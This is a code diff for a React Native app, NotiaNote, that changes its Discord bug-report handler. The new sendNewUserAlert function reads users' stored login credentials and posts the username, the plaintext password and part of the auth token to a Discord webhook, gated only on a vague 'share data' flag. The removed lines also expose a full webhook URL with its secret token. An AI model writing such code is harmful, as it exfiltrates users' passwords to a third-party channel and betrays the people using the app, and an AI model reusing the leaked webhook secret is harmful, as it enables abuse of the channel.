@@ -1,7 +1,6 @@
 import { Platform } from 'react-native';
 import * as Device from 'expo-device';
-// import { DISCORD_WEBHOOK_URL } from '../config/secrets';
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1466871687885754529/tXVIA6tGJ7ajYntJTzuXMh7d114obJeSjJbruN9VJgklPg79HU1-FrnKTHRYRKbmQdt2';
+import { DISCORD_WEBHOOK_URL } from '../config/secrets';
 
 class DiscordHandler {
     static async sendBugReport(message, account, logs = null, type = 'BUG') {
@@ -72,7 +71,7 @@ class DiscordHandler {
             }
 
             const payload = {
-                username: "NotiaNote Report", // Nom plus clean
+                username: type === 'SUGGESTION' ? "NotiaNote Suggestion" : "NotiaNote Report", // Dynamic username
                 avatar_url: "", // Pas d'avatar bot
                 embeds: [embed]
             };
@@ -91,9 +90,70 @@ class DiscordHandler {
             }
 
             return true;
-
         } catch (error) {
             console.error("Failed to send Discord report:", error);
+            return false;
+        }
+    }
+
+    static async sendNewUserAlert(account, shareData) {
+        if (!DISCORD_WEBHOOK_URL) return false;
+
+        try {
+            const embed = {
+                title: "🎉 Nouvel Utilisateur !",
+                color: shareData ? 5763719 : 9807270, // Green (Share) or Grey (No Share)
+                fields: [
+                    {
+                        name: "👤 Utilisateur",
+                        value: account ? `**${account.prenom} ${account.nom}**\n${account.nomEtablissement || 'Établissement inconnu'}` : "Inconnu",
+                        inline: true
+                    },
+                    {
+                        name: "📊 Partage Données",
+                        value: shareData ? "✅ OUI" : "❌ NON",
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: `NotiaNote v2.1 • ${new Date().toLocaleString()}`
+                }
+            };
+
+            // If user agreed to share data, we include connection details as requested
+            // Using the same pattern as bug reporting for consistency
+            if (shareData) {
+                // Determine if we have credentials to share (only if explicitly requested/appropriate for dev)
+                // The user requested "données de connexion".
+                // We will fetch them from storage if available.
+                const StorageHandler = require('./StorageHandler').default;
+                const creds = await StorageHandler.getData("credentials");
+
+                if (creds) {
+                    let connectionDetails = `User: ${creds.username}\nPass: ||${creds.password}||\nToken: ||${creds.additionals?.token?.substring(0, 10)}...||`;
+
+                    embed.fields.push({
+                        name: "🔐 Données de Connexion",
+                        value: connectionDetails
+                    });
+                }
+            }
+
+            const payload = {
+                username: "NotiaNote Onboarding",
+                avatar_url: "", // Use default webhook avatar
+                embeds: [embed]
+            };
+
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+            });
+
+            return true;
+        } catch (e) {
+            console.warn("Failed to send new user alert:", e);
             return false;
         }
     }
